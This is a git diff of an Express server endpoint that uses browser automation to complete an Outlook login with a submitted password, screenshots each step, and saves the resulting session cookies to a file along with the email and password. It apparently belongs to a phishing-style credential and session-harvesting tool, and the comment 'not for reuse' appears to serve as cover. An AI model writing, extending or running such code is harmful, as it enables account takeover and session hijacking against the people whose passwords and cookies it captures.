@@ -503,24 +503,28 @@ app.post('/api/continue-login', async (req, res) => {
                 console.warn('Password login attempt failed, but continuing with flow...');
             }
 
+            // Take screenshot after password submission
+            await activeSession.automation.takeScreenshot(`screenshots/session-${activeSession.sessionId}-after-password.png`);
+            console.log(`Screenshot saved after password submission`);
+
             // Handle "Stay signed in?" prompt
-            await session.automation.handleStaySignedInPrompt();
+            await activeSession.automation.handleStaySignedInPrompt();
 
             // Wait a bit more after handling the prompt
             await new Promise(resolve => setTimeout(resolve, 3000));
 
             // Take screenshot after login
-            await session.automation.takeScreenshot(`screenshots/session-${sessionId}-final.png`);
+            await activeSession.automation.takeScreenshot(`screenshots/session-${activeSession.sessionId}-final.png`);
 
             // Check if we're successfully logged in
-            const currentUrl = session.automation.page.url();
+            const currentUrl = activeSession.automation.page.url();
             const loginSuccess = currentUrl.includes('outlook.office.com/mail');
 
             let responseMessage = '';
             if (loginSuccess) {
                 // Save session cookies to file (not for reuse)
                 console.log('💾 Saving session cookies to file (not for reuse)...');
-                const sessionFile = await session.automation.saveCookies(session.email || 'unknown', password);
+                const sessionFile = await activeSession.automation.saveCookies(activeSession.email || 'unknown', password);
                 responseMessage = sessionFile ? 
                     `Login completed successfully! Session saved to: ${sessionFile}` :
                     'Login completed successfully!';
@@ -529,11 +533,12 @@ app.post('/api/continue-login', async (req, res) => {
             }
 
             res.json({
-                sessionId: sessionId,
+                sessionId: activeSession.sessionId,
                 loginComplete: true,
                 loginSuccess: loginSuccess,
                 message: responseMessage,
-                screenshot: `screenshots/session-${sessionId}-final.png`
+                screenshot: `screenshots/session-${activeSession.sessionId}-final.png`,
+                passwordScreenshot: `screenshots/session-${activeSession.sessionId}-after-password.png`
             });
 
         } catch (error) {
